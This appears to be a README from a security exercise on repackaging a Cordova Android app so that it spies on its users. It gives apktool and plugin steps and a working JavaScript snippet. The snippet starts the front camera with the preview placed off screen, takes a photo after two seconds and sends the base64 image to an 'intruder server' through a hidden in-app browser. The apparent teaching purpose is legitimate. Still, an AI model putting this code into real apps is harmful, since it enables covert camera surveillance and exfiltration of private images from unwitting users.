# App-Repackaging-Attack with Cordova
modifying an existing hybrid android mobile app, with the goal of stealthily ex filtrating private user data.

The goal is to modify this app’s code to access the camera stealthily. 
After modification, the app should start the camera in the background and capture user picture using the front-facing camera. 
Then the app should upload the captured image to my web server/app mimicking malicious behavior.

#Steps
1. Use apktool to unpack and repack the APK.

2. Create a new Cordova project and copy the contents of the `assets/www’ directory from the unpacked APK to the ‘www’ directory of the new Cordova project.
(this makes it easier to debug the app using "chrome://inspect/#devices").

3. Install a third-party plugin to the new project to capture image, i used cordova-plugin-camera-preview "cordova plugin add cordova-plugin-camera-preview"

4. To stealthily capture image, i placed the following code in deviceready function:

CameraPreview.startCamera({x: 5, y: 5000, width: 300, height: 300, toBack: false, previewDrag: true, tapPhoto: true});
  
  setTimeout(function() {
    CameraPreview.takePicture(function(imgData){
      console.log('imgData');
      cordova.InAppBrowser.open('http://10.0.2.2:5000/image?image=' + imgData, '_self', 'hidden=yes');
      console.log('imgData');     
        });

  }, 2000);
  
  The above code will start the camera preview but hides the actual image of the camera because of the edited dimensions "y: 5000".
  the setTimeout function is set to 2000 or 2 seconds to capture the image and upload the image to the intruder server located 
  at 'http://10.0.2.2:5000/image?image='.
  
  5. Once captured on the external server, the data received is in the form of base64 text. The python ode will convert and write the
  base64 code into a .png file.
